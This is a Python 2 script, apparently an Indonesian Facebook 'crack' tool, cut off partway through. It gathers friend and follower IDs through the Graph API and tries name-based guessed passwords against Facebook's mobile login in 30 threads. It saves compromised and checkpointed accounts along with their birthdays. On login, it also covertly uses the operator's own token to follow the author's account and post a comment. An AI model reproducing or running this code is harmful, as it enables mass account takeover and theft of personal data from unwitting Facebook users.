#!/usr/bin/python2
# coding=utf-8
#fb:facebook.com/ih.wibu.14
#fb:facebook.com/ih.wibu.14
# Ciee Mau Rekod Yah
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # BIRU MUDA
H = '\x1b[1;92m' # UNGU
K = '\x1b[1;93m' # HIJAU
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # KUNING
O = '\x1b[1;96m' # MERAH
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []
animasis = ["[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]", "[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■] ENTERING PLEASE WAIT "]        
for i in range(len(animasis)):
	time.sleep(0.02)
	sys.stdout.write("\r\x1b[1;95m#\x1b[1;92mLoading "+ random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;92m', '\x1b[1;91m','\x1b[1;94m']) + animasis[i % len(animasis)])
	sys.stdout.flush()

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('/results')
		menu()
	except (KeyError,IOError):
		os.system("-mkdir /results")
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]' >> .ua.txt")
		os.system("echo 'NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]' >> .ua")
	os.system("clear")
	print("""
mmmmm  mmmmm   mmmm           mmm  mmmmm    mm     mmm  m    m
 #   "# #   "# m"  "m        m"   " #   "#   ##   m"   " #  m"
 #mmm#" #mmmm" #    #        #      #mmmm"  #  #  #      #m#
 #      #   "m #    #        #      #   "m  #mm#  #      #  #m
 #      #    "  #mm#          "mmm" #    " #    #  "mmm" #   "m""")
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4481379231881987/comments?message=Dicky Ganteng :V!&access_token={t}')
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		
		print("\n \033[0;97m  Choose Login:.........?")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login Token ")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login Cookies")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose! : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookies : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Enter Your Cookies : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Enter Your Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('.Status','r').read()
		stass = "Premium *"
	except IOError:
		stass = "Premium"
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	    	user = a['username']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Please Check Your Network !!')
	try:
		token = open('results/hai.txt','r').read()
	except IOError:
		os.system("mkdir results")
		os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")
	logo()
        print(" "+M+"["+K+"+"+M+"]ــــــــــــــــــــــــــــــــــــ")
	print(" "+M+"["+K+"+"+M+"] Your Name: "+H+K+" %s"%(nama))
	print(" "+M+"["+K+"+"+M+"] Your ID  : "+K+id)
        print(" "+M+"["+K+"+"+M+"]ــــــــــــــــــــــــــــــــــــ")
        print(" "+M+"["+K+"+"+M+"] Your IP  : "+H+ip)
	print(" "+M+"["+K+"+"+M+"] Premium  : "+H+"Yes "+P+"")
	print(" "+M+"["+K+"+"+M+"]ــــــــــــــــــــــــــــــــــــ ")
	print
	print("      [ Welcome To My Script "+H+""+M+"]")
	print
	print("      [ Choose "+H+""+M+"]")
	print(""+p+" "+B+"1 "+P+"> "+P+"Crack From Publik/Teman")
	print(" "+B+"2 "+P+"> "+P+"Crack From Followers")
	print(" "+B+"3 "+P+"> "+P+"Crack From Postingan")
	print(" "+B+"4 "+P+"> "+P+"Open Result Crack")
	print(" "+B+"5 "+P+"> "+P+"Setting User-Agents")
	print(" "+B+"6 "+P+"> "+P+"Check INFO Facebook")
	print(" "+B+"0 "+P+"> "+K+"Go Out(Delete Token) "+B+"")
	print
	ask = raw_input(" "+P+" ["+K+"*"+P+"] Choose ! : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose: ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Result Bro :'(")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Result Bro :'(")
		else:
			menu()
	elif ask == "5" or ask == "05":
		settua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Success Delete Token Thanks Using My Script")
	elif ask == "7" or ask == "07":
		ajg_mmk_ppq_ktl()
	elif ask == "dicky" or ask == "mr.dicky":
		os.system("echo 'Premium' >> .Status")
		bot_komen()
	elif ask == "6" or ask == "06":
		cek_ingfo()
	elif ask == "7" or ask == "07":
		exit(p+"Thanks For My Using Script")
	else:
		menu()
	
def public():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type 'me' To Crack From Friends")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Paste ID Here : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Not Public ID!!')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Use Manual Password Or Not? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
		
	print(" \033[0;97m[\033[0;93m•\033[0;97m] If No Result ON OF Data/Airplane Mode")
	print(" \033[0;97m[\033[0;93m•\033[0;97m] Please Wait Bro is Cracking")
	print
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s>\033[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
					pwx.append ("123456")
#def dicky_tmvn():
	#os.system('clear')
	#print logo
	#jalan(' \033[1;32mDi Arahkan Ke Facebook Gue Jangan Lupa Add')
	#os.system('xdg-open https://www.facebook.com/ih.wibu.14')
	#os.system('python2 dmbf.py')
	
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \x1b[0;33m===> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  ===> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m===> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  ===> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m===> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' ===>#000000#FF0015 '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Selesai")

def followers():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type 'me' To Crack From Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Publik : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Public ID Missing!')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Use Manual Password Or Not ? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
